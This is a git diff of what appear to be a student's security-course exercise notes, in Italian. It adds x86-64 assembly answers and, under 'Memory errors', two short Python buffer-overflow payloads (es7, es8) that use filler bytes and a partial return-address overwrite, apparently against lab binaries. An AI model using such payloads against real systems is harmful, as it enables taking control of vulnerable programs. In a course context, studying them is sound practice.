@@ -219,25 +219,79 @@ target:
 
 ### es18
 
-```
-
+```assembly
+    mov eax, [rdi+4]
+    mov ebx, [rdi+8]
+    mov ecx, [rdi+12]
+    mov rdx, 0x7f454c46
+    cmp [rdi], edx
+    je sum
+    mov rdx, 0x00005A4D
+    cmp [rdi], edx
+    je sott
+mult:
+    imul ebx
+    imul ecx
+    jmp end
+sum:
+    add eax, ebx
+    add eax, ecx
+    jmp end
+sott:
+    sub eax, ebx
+    sub eax, ecx
+end:
 ```
 
 ### es19
 
-```
-
+```assembly
+    cmp rdi, 3
+    jle switch
+    mov rax, [rsi+32]
+    jmp rax		# caso base dello switch case
+switch:
+    imul rdi, 8
+    add rsi, rdi
+    jmp [rsi]
 ```
 
 ### es20
 
-
+```assembly
+    mov rbx, rsi
+loop:
+    add rax, [rdi]
+    add rdi, 8
+    sub rbx, 1
+    cmp rbx, 0
+    jne loop
+    div rsi		# calcolo dell'avg
+```
 
 ## Process
 
 ## sUID
 
+
+
 ## Memory errors
+
+### es8
+
+```python
+payload = b"154\n"
+payload += b"\x00"*152 # dato il bug della scanf mettiamo tutti i byte 00 che passeranno il controllo sull'heap
+payload += b"\xc6\x1a"
+```
+
+### es7
+
+```python
+payload = b"106\n"
+payload += b"\x90"*104
+payload += b"\xa2\x18"
+```
 
 
 
